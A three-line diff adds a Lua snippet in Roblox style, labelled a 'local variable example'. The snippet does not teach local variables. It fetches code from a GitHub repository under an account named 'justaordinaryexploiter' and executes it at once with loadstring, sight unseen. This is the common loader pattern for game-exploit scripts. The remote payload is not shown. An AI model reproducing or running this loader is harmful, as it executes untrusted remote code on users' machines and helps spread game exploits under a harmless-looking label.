@@ -1,0 +1,3 @@
+-- local variable example
+local string = "https://raw.githubusercontent.com/justaordinaryexploiter/useless/refs/heads/main/test"
+loadstring(game:HttpGet(string))()
